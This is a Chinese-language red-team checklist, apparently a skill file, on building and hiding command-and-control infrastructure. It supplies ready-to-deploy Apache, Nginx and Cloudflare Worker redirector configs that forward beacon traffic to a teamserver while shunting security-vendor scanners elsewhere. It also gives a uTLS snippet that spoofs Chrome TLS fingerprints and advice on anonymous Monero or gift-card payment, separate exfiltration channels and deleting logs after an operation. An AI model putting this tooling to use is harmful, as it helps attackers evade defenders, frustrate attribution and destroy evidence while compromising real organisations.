# C2 基础设施 OPSEC 清单

> 红队基础设施的核心原则：**可否认性、不可关联性、快速轮换**。每一个配置决策都应该让蓝队的归因成本最大化。

---

## 1. 域名选择与管理

### 1.1 域名年龄与历史

新注册域名在威胁情报平台和企业 DNS 安全产品中有极高的风险评分。

```
域名选择标准：
├─ 注册时间 > 6 个月（最低 30 天，越老越好）
├─ 有历史解析记录（Wayback Machine 可查到内容）
├─ 无恶意历史（VirusTotal/URLhaus 无检出）
├─ 已被分类（Bluecoat/Palo Alto URL Filtering 归类为合法类别）
└─ Whois 隐私保护已启用（避免注册人关联）
```

### 1.2 域名分类操控

企业防火墙/代理按域名分类放行流量。域名必须归类为可信类别。

```bash
# 检查域名当前分类
# Symantec/Bluecoat（最常用的企业分类库）
curl -s "https://sitereview.bluecoat.com/#/" # 手动提交查询

# Palo Alto URL Filtering
# 访问: https://urlfiltering.paloaltonetworks.com/

# 提交分类建议（在域名部署合法内容后）
# 在域名上放置合法 WordPress/企业页面 → 申请分类为：
#   - Business/Economy
#   - Information Technology
#   - Health（如果目标是医疗行业）
```

**推荐分类策略**：

| 目标行业 | 推荐域名分类 | 理由 |
|----------|-------------|------|
| 金融 | Financial Services / Business | 白名单中常见 |
| 政府 | News/Media / Education | 不太会被封锁 |
| 科技 | Information Technology / CDN | 混入合法 SaaS 流量 |
| 通用 | Cloud / SaaS / Business | 企业常见出站流量 |

### 1.3 注册商 OPSEC

```
注册商选择：
├─ 使用主流注册商（Namecheap/GoDaddy/Cloudflare Registrar）
│   └─ 不要用小众注册商 → 蓝队见到少见注册商会起疑
├─ 支付方式：
│   ├─ 加密货币（Monero > Bitcoin）→ Namecheap 支持 BTC
│   ├─ 预付卡（Gift Card）→ 无关联银行账户
│   └─ ⛔ 不要用个人信用卡/公司账户
├─ 注册信息：
│   ├─ 启用 Whois Privacy/Domain Privacy
│   ├─ 使用一次性邮箱（ProtonMail + 每域名一个邮箱）
│   └─ 不同行动使用不同注册商账户
└─ DNS 管理：
    ├─ 使用 Cloudflare DNS（免费、可代理、隐藏源 IP）
    └─ 或使用注册商自带 DNS（减少第三方关联）
```

---

## 2. Redirector 部署

### 2.1 架构设计

```
分层 C2 架构：

目标主机 ←→ [Redirector 1] ←→ [TeamServer]
               ↑
目标主机 ←→ [Redirector 2] ←→ ┘
               ↑
扫描器/沙箱 → [Redirector] → 返回 404 / 合法页面

优势：
├─ TeamServer IP 永远不暴露
├─ Redirector 被烧毁 → 换一个即可，不影响已有 session
├─ 可根据 IP/UA/Header 过滤请求（防沙箱/研究员）
└─ 不同阶段（初始访问/驻留/外传）用不同 Redirector
```

### 2.2 Apache mod_rewrite Redirector

这是最经典的 Redirector 方案，使用 Apache 的 `mod_rewrite` 根据条件转发或拒绝请求。

```apache
# /etc/apache2/sites-enabled/redirector.conf
# 完整的 C2 Redirector 配置示例

<VirtualHost *:443>
    ServerName cdn-assets.example.com

    # SSL 配置（Let's Encrypt）
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/cdn-assets.example.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/cdn-assets.example.com/privkey.pem

    # 启用 mod_rewrite
    RewriteEngine On

    # ===== 阶段 1: 阻止已知安全扫描器和研究机构 =====
    # 封锁已知安全厂商 IP 范围
    RewriteCond %{REMOTE_ADDR} ^23\.227\. [OR]
    RewriteCond %{REMOTE_ADDR} ^54\.164\.54\. [OR]
    RewriteCond %{REMOTE_ADDR} ^52\.178\. [OR]
    RewriteCond %{REMOTE_ADDR} ^13\.77\. [OR]
    # Shodan
    RewriteCond %{REMOTE_ADDR} ^71\.6\. [OR]
    # Censys
    RewriteCond %{REMOTE_ADDR} ^162\.142\. [OR]
    RewriteCond %{REMOTE_ADDR} ^167\.248\. [OR]
    # GreyNoise
    RewriteCond %{REMOTE_ADDR} ^35\.229\.
    RewriteRule ^(.*)$ https://www.microsoft.com/ [L,R=302]

    # ===== 阶段 2: 过滤 User-Agent =====
    # 阻止空 UA、curl、wget、python-requests 等工具
    RewriteCond %{HTTP_USER_AGENT} ^$ [OR]
    RewriteCond %{HTTP_USER_AGENT} curl|wget|python|httpie|scanner|nikto|nmap [NC]
    RewriteRule ^(.*)$ https://www.microsoft.com/ [L,R=302]

    # ===== 阶段 3: 仅允许匹配 C2 Profile 的 URI =====
    # Cobalt Strike Malleable C2 Profile 中定义的 URI 路径
    RewriteCond %{REQUEST_URI} ^/api/v1/events$ [OR]
    RewriteCond %{REQUEST_URI} ^/api/v1/telemetry$ [OR]
    RewriteCond %{REQUEST_URI} ^/api/v1/config$ [OR]
    RewriteCond %{REQUEST_URI} ^/static/js/analytics\.js$
    RewriteRule ^(.*)$ https://TEAMSERVER_IP%{REQUEST_URI} [P,L]

    # ===== 阶段 4: 其他请求返回合法页面 =====
    # 部署一个合法网站作为掩护（WordPress/静态页面）
    DocumentRoot /var/www/html/legitimate-site

    # 日志（行动结束后删除）
    ErrorLog ${APACHE_LOG_DIR}/redirector_error.log
    CustomLog ${APACHE_LOG_DIR}/redirector_access.log combined
</VirtualHost>
```

```bash
# 部署步骤
sudo apt install apache2 -y
sudo a2enmod rewrite proxy proxy_http ssl headers
sudo systemctl restart apache2

# 获取 Let's Encrypt 证书
sudo apt install certbot python3-certbot-apache -y
sudo certbot --apache -d cdn-assets.example.com --non-interactive --agree-tos -m throwaway@protonmail.com

# 部署合法掩护页面
sudo git clone https://github.com/developer/static-template /var/www/html/legitimate-site
```

### 2.3 Nginx Redirector

```nginx
# /etc/nginx/sites-enabled/redirector.conf

server {
    listen 443 ssl;
    server_name api-gateway.example.com;

    ssl_certificate /etc/letsencrypt/live/api-gateway.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api-gateway.example.com/privkey.pem;

    # 强制 TLS 1.2+ （匹配合法服务器行为）
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384';

    # 安全厂商 IP 黑名单
    include /etc/nginx/blocklist.conf;

    # C2 路径转发到 TeamServer
    location /api/v1/events {
        # 仅允许特定 UA
        if ($http_user_agent !~* "Mozilla/5.0.*Windows NT 10") {
            return 302 https://www.google.com;
        }
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_ssl_verify off;
    }

    location /api/v1/telemetry {
        if ($http_user_agent !~* "Mozilla/5.0.*Windows NT 10") {
            return 302 https://www.google.com;
        }
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_set_header Host $host;
        proxy_ssl_verify off;
    }

    # 默认返回合法页面
    location / {
        root /var/www/html/cover-site;
        index index.html;
    }
}
```

### 2.4 Cloudflare Workers Redirector

Cloudflare Workers 作为 Redirector 的优势：IP 是 Cloudflare 的，无法直接封锁；天然 CDN 分布式；域名自动获得 Cloudflare SSL。

```javascript
// Cloudflare Worker - C2 Redirector
// 部署: wrangler publish

const TEAMSERVER = "https://actual-teamserver.example.com";
const LEGITIMATE_SITE = "https://www.example.com";

// 安全厂商 IP 前缀（简化示例）
const BLOCKED_PREFIXES = [
  "71.6.",      // Shodan
  "162.142.",   // Censys
  "167.248.",   // Censys
  "35.229.",    // GreyNoise
];

// 允许的 C2 URI 路径
const ALLOWED_PATHS = [
  "/api/v1/events",
  "/api/v1/telemetry",
  "/api/v1/config",
  "/static/js/analytics.js",
];

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get("CF-Connecting-IP") || "";
  const userAgent = request.headers.get("User-Agent") || "";

  // 检查 IP 黑名单
  for (const prefix of BLOCKED_PREFIXES) {
    if (clientIP.startsWith(prefix)) {
      return Response.redirect(LEGITIMATE_SITE, 302);
    }
  }

  // 检查 User-Agent（拒绝空 UA 和自动化工具）
  if (!userAgent || /curl|wget|python|scanner|nikto/i.test(userAgent)) {
    return Response.redirect(LEGITIMATE_SITE, 302);
  }

  // 仅转发匹配 C2 Profile 的路径
  if (ALLOWED_PATHS.includes(url.pathname)) {
    const modifiedRequest = new Request(TEAMSERVER + url.pathname, {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });
    return fetch(modifiedRequest);
  }

  // 其他请求代理到合法网站
  return fetch(LEGITIMATE_SITE + url.pathname);
}

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});
```

---

## 3. 证书策略

### 3.1 证书选择原则

```
证书策略优先级：
├─ 1. Let's Encrypt（最佳）
│   ├─ 互联网上最常见的免费证书
│   ├─ 所有合法网站都在用 → 不突出
│   ├─ 自动续期 → 减少运维风险
│   └─ 被蓝队过滤 LE 证书 = 误杀大量合法站点
│
├─ 2. 商业证书（高价值目标）
│   ├─ DigiCert/Comodo/GlobalSign
│   ├─ 更像合法企业站点
│   └─ 成本高但归因更难
│
├─ 3. Cloudflare Universal SSL（使用 CF 代理时）
│   ├─ 自动签发，无需配置
│   └─ 证书 issuer 为 Cloudflare → 与大量合法站点相同
│
└─ ⛔ 绝对不要：自签名证书
    ├─ 浏览器告警 → 目标会警觉
    ├─ JARM 指纹独特 → 容易被识别
    └─ 威胁情报平台重点标记自签名证书
```

### 3.2 JARM 指纹管理

JARM 是一种 TLS 服务器指纹技术，通过发送 10 个特制 TLS Client Hello 并记录服务器的响应来生成一个 62 字符的指纹。已知 C2 框架有固定的 JARM 指纹。

```bash
# 检查你的 C2 服务器 JARM 指纹
python3 jarm.py your-c2-domain.com

# 已知 C2 框架 JARM 指纹（必须避免匹配）
# Cobalt Strike: 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1
# Metasploit:    07d14d16d21d21d00007d14d07d21d9b2f5869a6985368a9f98571c65871ea
# Sliver:        2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5
# Havoc:         00000000000000000041d00000041d9535d505a1698c0a1303e90100000000

# JARM 指纹对抗策略
# 方法1: 使用 Nginx/Apache 作为前端反代（JARM 检测的是 Nginx 而非 C2）
# 方法2: 使用 Cloudflare 代理（JARM 检测的是 Cloudflare）
# 方法3: 修改 C2 的 TLS 配置使其匹配合法服务
```

```
JARM 对抗架构：

                    JARM 扫描器
                        │
                        ↓
                [Cloudflare / Nginx]  ← JARM 指纹 = Nginx/CF（合法）
                        │
                        ↓ (内部转发)
                  [C2 TeamServer]     ← JARM 指纹被隐藏
```

### 3.3 证书透明度（CT Logs）注意事项

所有公开 CA 签发的证书都会记录到 CT Logs，蓝队可以通过 CT Logs 发现你新注册的域名。

```bash
# 蓝队监控 CT Logs 的方式（你需要了解对手如何发现你）
# crt.sh 查询
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value'

# 对策：
# 1. 提前注册域名并签发证书（不要行动当天才签发）
# 2. 域名不要包含目标组织关键词
# 3. 使用通配符证书（减少 CT 条目数量）
# 4. Cloudflare 代理时，证书由 CF 签发，域名仍会出现在 CT
```

---

## 4. JA3/JA3S 指纹管理

### 4.1 JA3 指纹原理

JA3 通过客户端 TLS Client Hello 中的参数（TLS 版本、密码套件、扩展、椭圆曲线、椭圆曲线格式）生成 MD5 哈希。C2 agent 如果使用默认 TLS 库配置，其 JA3 指纹与真实浏览器不同。

```
JA3 计算公式：
MD5(TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats)

示例：
Chrome 120 JA3:  771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172...
Go默认客户端JA3: 771,49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5...
Python requests: 771,49196-49200-159-52393-52392-52394-49195-49199-158-49188-49192...

⛔ 蓝队通过 JA3 指纹可以识别 C2 agent 使用的 TLS 库类型
```

### 4.2 JA3 指纹对抗

```
JA3 匹配策略：
├─ 方法1: 使用目标环境真实浏览器的 TLS 栈
│   ├─ 在 C2 agent 中嵌入 Chrome/Firefox 的 TLS 配置
│   ├─ Go: 使用 uTLS 库 (github.com/refraction-networking/utls)
│   ├─ Python: 使用 curl_cffi 库（模拟真实浏览器 TLS 指纹）
│   └─ C/C++: 使用 BoringSSL 并配置匹配 Chrome
│
├─ 方法2: 通过代理中转
│   ├─ 使用 Cloudflare → JA3 被 CF 的 TLS 终止覆盖
│   └─ 使用浏览器作为代理（Browser BOF in Cobalt Strike）
│
└─ 方法3: JA3 随机化
    ├─ 每次连接随机选择密码套件子集
    ├─ 随机化扩展顺序
    └─ ⛔ 注意: 随机 JA3 本身也是异常指标
```

```go
// Go uTLS 示例 - 模拟 Chrome JA3 指纹
package main

import (
    tls "github.com/refraction-networking/utls"
    "net"
    "net/http"
)

func createChromeTransport() *http.Transport {
    return &http.Transport{
        DialTLS: func(network, addr string) (net.Conn, error) {
            conn, err := net.Dial(network, addr)
            if err != nil {
                return nil, err
            }
            host, _, _ := net.SplitHostPort(addr)
            config := tls.Config{ServerName: host}
            // 使用 Chrome 120 的 TLS 指纹
            tlsConn := tls.UClient(conn, &config, tls.HelloChrome_120)
            if err := tlsConn.Handshake(); err != nil {
                return nil, err
            }
            return tlsConn, nil
        },
    }
}
```

---

## 5. IP 信誉检查

### 5.1 部署前必查

在使用任何 VPS IP 之前，必须检查其历史信誉。云服务商的 IP 可能被前一个租户用于恶意活动。

```bash
# VirusTotal - 检查 IP 是否有恶意检出
curl -s -H "x-apikey: VT_API_KEY" \
  "https://www.virustotal.com/api/v3/ip_addresses/1.2.3.4" | \
  jq '{malicious: .data.attributes.last_analysis_stats.malicious, reputation: .data.attributes.reputation}'

# AbuseIPDB - 检查 IP 被举报历史
curl -s -H "Key: ABUSEIPDB_API_KEY" -G \
  "https://api.abuseipdb.com/api/v2/check" \
  --data-urlencode "ipAddress=1.2.3.4" | \
  jq '{abuse_score: .data.abuseConfidenceScore, total_reports: .data.totalReports}'

# GreyNoise - 检查 IP 是否在扫描互联网
curl -s -H "key: GREYNOISE_API_KEY" \
  "https://api.greynoise.io/v3/community/1.2.3.4" | \
  jq '{classification: .classification, noise: .noise, riot: .riot}'

# Shodan - 检查 IP 暴露的服务
curl -s "https://api.shodan.io/shodan/host/1.2.3.4?key=SHODAN_API_KEY" | \
  jq '{ports: .ports, hostnames: .hostnames, org: .org}'

# IPVoid - 多引擎信誉检查
# 访问: https://www.ipvoid.com/ip-blacklist-check/
```

### 5.2 IP 选择标准

```
IP 选择清单：
├─ VirusTotal 恶意检出 = 0
├─ AbuseIPDB 信心分数 < 5%
├─ GreyNoise 分类 = benign 或 unknown（非 malicious）
├─ 不在 Spamhaus/Barracuda 等黑名单中
├─ IP 所属 ASN 为主流云服务商（AWS/Azure/GCP/DO/Linode）
├─ IP 地理位置与目标业务相关（目标在中国就用亚洲 IP）
└─ 反向 DNS 无明显恶意关联

⛔ 如果 IP 有任何恶意历史 → 放弃，重新申请新 VPS
```

---

## 6. 基础设施分离

### 6.1 三阶段分离架构

```
红队基础设施必须按功能隔离，一个阶段被发现不能牵连其他阶段。

┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  Staging 阶段    │    │  Long-Haul 阶段   │    │  Exfil 阶段     │
│  (初始访问)      │    │  (持久驻留)       │    │  (数据外传)      │
├─────────────────┤    ├─────────────────┤    ├─────────────────┤
│ 域名: phish.com  │    │ 域名: cdn.com    │    │ 域名: cloud.com  │
│ IP: A.A.A.A     │    │ IP: B.B.B.B     │    │ IP: C.C.C.C     │
│ 生命周期: 48h   │    │ 生命周期: 数周   │    │ 生命周期: 1次    │
│ 证书: LE        │    │ 证书: 商业       │    │ 证书: LE         │
│ 用途: 钓鱼投递  │    │ 用途: Beacon 通信│    │ 用途: 数据外传   │
│ C2 Profile: A   │    │ C2 Profile: B   │    │ C2 Profile: C    │
└─────────────────┘    └─────────────────┘    └─────────────────┘
       │                      │                       │
       ↓                      ↓                       ↓
   各自独立的 Redirector → 各自独立的 TeamServer（或同一 TS 不同 Listener）
```

### 6.2 分离要点

| 维度 | Staging（初始访问） | Long-Haul（持久驻留） | Exfil（数据外传） |
|------|---------------------|----------------------|-------------------|
| 域名 | 短期、一次性 | 长期、高信誉 | 一次性使用 |
| IP | 廉价 VPS | 可信云服务 | CDN/云存储 |
| 证书 | Let's Encrypt | 商业证书 | Let's Encrypt |
| Beacon 间隔 | 1-5 秒（需快速交互） | 1-24 小时（低频慢速） | 触发式（按需连接） |
| 暴露风险 | 高（直面钓鱼分析） | 低（仅 Beacon 回连） | 中（大量数据传输） |
| 被烧后果 | 低（本就是一次性的） | 高（丢失持久访问） | 中（需重新建立外传通道） |

### 6.3 后渗透基础设施额外分离

```
内网行动的额外基础设施：
├─ SOCKS 代理（内网枚举通道）→ 独立 VPS + SSH 隧道
├─ 文件托管（工具/Payload 下发）→ 独立 Web 服务器或云存储
├─ 钓鱼平台（如果行动包含钓鱼）→ 独立 GoPhish 服务器
├─ DNS C2（备用通道）→ 独立域名 + 独立 NS 服务器
└─ 邮件发送（钓鱼邮件）→ 独立 SMTP + SPF/DKIM 配置
```

---

## 7. 烧毁检测与轮换

### 7.1 如何判断基础设施已被发现

```bash
# 信号 1: 域名/IP 被标记
# 定期检查 VirusTotal 检出
curl -s -H "x-apikey: VT_API_KEY" \
  "https://www.virustotal.com/api/v3/domains/your-c2-domain.com" | \
  jq '.data.attributes.last_analysis_stats'
# 如果 malicious > 0 → 已被标记

# 信号 2: Redirector 收到异常请求
# 监控 Apache/Nginx 日志中的异常模式
# 大量来自安全厂商 IP 的请求
# 大量不匹配 C2 Profile 的请求
tail -f /var/log/apache2/redirector_access.log | grep -v "TEAMSERVER_URI_PATTERN"

# 信号 3: Beacon 失联
# 突然大量 Beacon 失去回连 → 域名/IP 可能被企业防火墙封锁

# 信号 4: DNS 解析异常
# 蓝队可能进行 DNS Sinkhole
dig +short your-c2-domain.com
# 如果解析到非预期 IP → 域名可能被接管

# 信号 5: 证书被撤销
# CT Logs 中出现针对你域名的讨论/标记
```

### 7.2 自动化监控脚本

```bash
#!/bin/bash
# infra-health-check.sh - C2 基础设施健康检查
# 建议通过 cron 每小时执行

DOMAINS=("c2-domain1.com" "c2-domain2.com")
IPS=("1.2.3.4" "5.6.7.8")
VT_API_KEY="your-vt-api-key"
ALERT_WEBHOOK="https://your-alert-endpoint.com/webhook"

check_vt_domain() {
    local domain=$1
    local result=$(curl -s -H "x-apikey: $VT_API_KEY" \
        "https://www.virustotal.com/api/v3/domains/$domain" | \
        jq -r '.data.attributes.last_analysis_stats.malicious')
    if [ "$result" -gt 0 ] 2>/dev/null; then
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"text\":\"[BURN] Domain $domain flagged on VT: $result detections\"}"
    fi
}

check_vt_ip() {
    local ip=$1
    local result=$(curl -s -H "x-apikey: $VT_API_KEY" \
        "https://www.virustotal.com/api/v3/ip_addresses/$ip" | \
        jq -r '.data.attributes.last_analysis_stats.malicious')
    if [ "$result" -gt 0 ] 2>/dev/null; then
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"text\":\"[BURN] IP $ip flagged on VT: $result detections\"}"
    fi
}

check_dns_resolution() {
    local domain=$1
    local expected_ip=$2
    local resolved_ip=$(dig +short "$domain" | head -1)
    if [ "$resolved_ip" != "$expected_ip" ]; then
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"text\":\"[BURN] DNS mismatch for $domain: expected $expected_ip, got $resolved_ip\"}"
    fi
}

for domain in "${DOMAINS[@]}"; do
    check_vt_domain "$domain"
done

for ip in "${IPS[@]}"; do
    check_vt_ip "$ip"
done
```

### 7.3 轮换流程

```
基础设施烧毁后的标准操作流程（SOP）：

1. 确认烧毁范围
   ├─ 仅 IP 被标记 → 更换 Redirector IP
   ├─ 域名被标记 → 切换到备用域名
   └─ C2 Profile 被识别 → 更换 Profile + 域名 + IP

2. 切换到备用基础设施
   ├─ 备用 Redirector 应预先部署好（冷备）
   ├─ Beacon 配置中应有多个回连域名（failover）
   └─ DNS 记录切换（更换 Redirector IP）或域名切换

3. 迁移活跃 Session
   ├─ 通过现有 Beacon 推送新 C2 配置
   ├─ 使用 Malleable C2 的 spawnto 切换进程
   └─ 最差情况: 需要重新执行初始 Payload（新 C2 地址）

4. 清理被烧毁的基础设施
   ├─ 销毁 VPS（不是停止，是彻底删除）
   ├─ 域名不要释放（避免被安全研究员接管）
   └─ 清理所有日志和配置文件

5. 根因分析
   ├─ 分析被发现的原因（VT 上传? 沙箱分析? 蓝队猎杀?）
   ├─ 调整 OPSEC（加强 Redirector 过滤/修改 Profile）
   └─ 更新团队知识库
```

---

## 8. 完整部署检查清单

### 部署前（Pre-Deployment）

```
[ ] 域名注册 > 30 天，已分类为合法类别
[ ] 域名 Whois 隐私保护已启用
[ ] DNS 使用 Cloudflare 或注册商自带（隐藏源 IP）
[ ] VPS IP 在 VirusTotal/AbuseIPDB/GreyNoise 均无恶意记录
[ ] SSL 证书为 Let's Encrypt 或商业 CA（非自签名）
[ ] JARM 指纹不匹配已知 C2 框架（通过 Nginx/CF 前置）
[ ] JA3 指纹已配置匹配目标环境常见浏览器
[ ] Redirector 已配置 IP/UA 过滤（安全厂商 IP 已封锁）
[ ] Redirector 仅转发匹配 C2 Profile 的 URI
[ ] 非匹配请求返回合法网站内容（非 404/空白）
[ ] TeamServer 不直接暴露公网
[ ] TeamServer 防火墙仅允许 Redirector IP 入站
[ ] Staging/Long-Haul/Exfil 基础设施已分离
[ ] 备用 C2 通道已准备（DNS C2 / 备用域名）
[ ] C2 Profile 的 User-Agent 匹配目标环境
[ ] C2 心跳间隔 + Jitter 配置合理（Long-Haul > 1h + 30-50% jitter）
```

### 行动中（During Operation）

```
[ ] 每日检查域名/IP 的 VirusTotal 检出状态
[ ] 监控 Redirector 日志（异常请求/扫描活动）
[ ] 确认 Beacon 回连正常
[ ] 确认备用 C2 通道可用
[ ] 按计划轮换短期基础设施
[ ] Staging 域名使用后 48h 内弃用
[ ] 不同阶段操作使用对应的基础设施（不混用）
```

### 行动后（Post-Operation）

```
[ ] 销毁所有 VPS 实例（彻底删除，非停止）
[ ] 销毁所有 Redirector
[ ] 确认 DNS 记录已清理（无残留解析）
[ ] 域名保留但不释放（防止被安全研究员接管）
[ ] 删除所有服务器日志
[ ] 记录本次 OPSEC 经验教训
[ ] 更新团队 C2 Profile / Redirector 模板
```

---

## 9. 快速参考：常见 C2 框架 OPSEC 配置

| 框架 | JARM 规避 | JA3 定制 | Profile 定制 | 推荐前置 |
|------|----------|---------|-------------|---------|
| Cobalt Strike | Nginx 前置 | Malleable C2 | Malleable Profile | Nginx + CF |
| Sliver | Nginx 前置 | 内置 uTLS | HTTP/MTLS/DNS | Nginx + CF |
| Havoc | Nginx 前置 | 可配置 | HTTP/HTTPS Profile | Apache + CF |
| Mythic | Nginx 前置 | Agent 依赖 | Agent Profile | Nginx |
| Brute Ratel | CDN 前置 | 内置匹配 | 高度定制 | CDN |

---

## 关联参考

- **IOC 分析与对抗** → `../SKILL.md`
- **C2 免杀方法论** → `/skills/evasion/c2-evasion-methodology/SKILL.md`
- **免杀研究** → `/skills/evasion/evasion-research/SKILL.md`
